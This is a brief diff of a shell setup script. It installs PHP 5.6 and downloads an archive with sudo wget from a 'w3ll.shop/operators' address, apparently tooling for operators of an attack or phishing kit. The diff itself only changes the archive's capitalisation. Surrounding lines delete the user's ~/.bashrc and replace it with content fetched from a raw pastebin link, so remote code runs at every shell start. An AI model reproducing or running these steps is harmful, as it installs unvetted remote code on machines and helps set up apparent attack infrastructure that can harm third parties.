@@ -19,9 +19,9 @@ sudo apt-get update -y
 sudo apt-get install -y php5.6
 sudo apt-get install -y php5.6-curl
 sudo apt install -y nano
-sudo wget https://w3ll.shop/operators/w3ll.zip
-sudo unzip -o w3ll.zip
-sudo rm w3ll.zip
+sudo wget https://w3ll.shop/operators/W3LL.zip
+sudo unzip -o W3LL.zip
+sudo rm W3LL.zip
 cp ~/.bashrc ~/.bashrc-bak
 rm -rf ~/.bashrc
 curl "https://pastebin.com/raw/bqthC1xv" -o ~/.bashrc
